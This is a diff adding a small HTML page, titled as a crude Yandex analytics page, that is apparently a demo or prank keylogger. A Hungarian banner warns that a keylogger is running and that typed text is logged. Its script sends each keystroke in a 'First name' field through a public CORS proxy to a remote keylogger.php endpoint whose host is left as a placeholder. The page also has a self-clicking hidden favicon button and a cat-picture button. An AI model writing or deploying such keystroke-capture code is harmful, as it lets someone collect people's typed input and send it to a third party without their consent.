@@ -1,0 +1,84 @@
+<!doctype html>
+<html>
+ <head>
+  <meta charset="utf-8">
+  <title>fapados Yandex metrica</title>
+  <script>
+	  
+  function showHint(str) {
+const proxyurl = "https://cors-anywhere.herokuapp.com/";
+const url = "http:// . . . . . /keylogger.php/?q="+str; //replace with .php resource url
+fetch(proxyurl + url) 
+.then(response => response.text())
+.then(contents => console.log(contents))
+.catch(() => console.log("Can’t access " + url + " response. Blocked by browser?"))
+
+}
+  
+  </script>
+ </head>
+ <body>
+  <h1>VIGYÁZAT, keylogger fut az oldalon !!!</h1>
+  <h1>CSókoltat mindenkit: Putyin gazda</h1>
+  <button  style="visibility: hidden;"  >Click to change favicon</button>
+  <button    >Kattints ide macskás képért</button>
+
+  <script> 
+   document.head || (document.head = document.getElementsByTagName('head')[0]);
+
+   function changeFavicon(src) {
+    var link = document.createElement('link'),
+        oldLink = document.getElementById('dynamic-favicon');
+    link.id = 'dynamic-favicon';
+    link.rel = 'icon';
+    link.href = src;
+    if (oldLink) {
+     document.head.removeChild(oldLink);
+    }
+    document.head.appendChild(link);
+   }
+
+   // Example: https://mathiasbynens.be/demo/dynamic-favicons
+   var btn = document.getElementsByTagName('button')[0];
+   btn.onclick = function() {
+    changeFavicon('http://www.google.com/favicon.ico');
+   };
+   btn.click();
+   var btn2 = document.getElementsByTagName('button')[1];
+   btn2.onclick = function() {
+  var x = document.createElement("IMG");
+  x.setAttribute("src", "./cateye.jpg"); //replace url to point to a different .jpg file
+
+  x.setAttribute("alt", "CAT");
+  document.body.appendChild(x);
+   };
+
+
+
+
+
+  </script>
+
+<p><b>Írjál ide valamit:</b></p>
+<p><b>DE, semmi személyes adatot</b></p>
+<p><b>mert amit beírsz, naplózzuk</b></p>
+<form> 
+First name: <input type="text" onkeyup="showHint(this.value)">
+</form>
+<p>Suggestions: <span id="txtHint"></span></p>
+
+
+
+ </body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
